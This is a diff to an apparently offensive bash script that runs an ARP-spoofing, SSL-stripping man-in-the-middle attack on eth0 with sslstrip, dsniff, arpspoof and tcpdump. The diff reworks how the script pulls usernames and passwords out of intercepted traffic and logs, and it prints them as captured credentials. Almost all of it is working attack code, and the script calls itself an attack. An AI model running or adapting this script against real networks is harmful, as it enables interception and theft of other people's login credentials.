@@ -31,8 +31,9 @@ SSLSTRIP_PID=$!
 echo "[+] sslstrip running (PID: $SSLSTRIP_PID)"
 
 # Create log files
-touch sslstrip.log
-touch dsniff.log
+# Clear log files (Fix for ghost credentials)
+> sslstrip.log
+> dsniff.log
 
 # Tail the log file in the background to show credentials in real-time
 echo "[*] Waiting for credentials..."
@@ -47,20 +48,18 @@ echo "[*] Starting dsniff..."
 dsniff -i eth0 -m -d > dsniff.log 2>&1 &
 DSNIFF_PID=$!
 
-# Start tcpdump to show RAW traffic (The ultimate truth source)
-echo "[*] Starting tcpdump on port 5000 (Looking for 'password')..."
-# -l for buffered output
-# grep -a to handle binary output from tcpdump output
-# grep -o to extract ONLY the username/password part
-# awk to pretty print
-tcpdump -i eth0 -A port 5000 -l 2>/dev/null | \
-    grep --line-buffered -a "username=" | \
-    grep -o -E --line-buffered "username=[^&]+&password=[^[:space:]]+" | \
-    sed -u 's/&password=/\n    Password: /' | \
-    sed -u 's/username=/\n    Username: /' | \
-    while read line; do
-        echo -e "\n\033[1;31m[!] CAPTURED CREDENTIALS:\033[0m\033[1;32m$line\033[0m\n"
-    done &
+# Monitor sslstrip.log for credentials (more reliable than tcpdump parsing)
+echo "[*] Monitoring sslstrip.log for credentials..."
+tail -f sslstrip.log | grep --line-buffered -a -E "POST Data|username=" | while read line; do
+    echo -e "\n\033[1;31m[!] CAPTURED DATA EVENT:\033[0m\033[1;32m$line\033[0m\n"
+done &
+LOG_PID=$!
+
+# Also keep a raw tcpdump running just in case, but silent mostly
+# looking for `username` in plain text on eth0
+tcpdump -i eth0 -A -l 2>/dev/null | grep --line-buffered -a "username=" | while read line; do
+     echo -e "\n\033[1;31m[!] SAW PLAINTEXT CREDENTIALS ON WIRE:\033[0m\033[1;32m$line\033[0m\n"
+done &
 TCPDUMP_PID=$!
 
 # Start arpspoof
@@ -77,8 +76,7 @@ echo "[+] Attack running. Check sslstrip.log for credentials."
 echo "Press ENTER to stop the attack."
 read
 
-kill $TAIL_PID1
-kill $TAIL_PID2
+kill $LOG_PID
 kill $SSLSTRIP_PID
 kill $DSNIFF_PID
 kill $TCPDUMP_PID
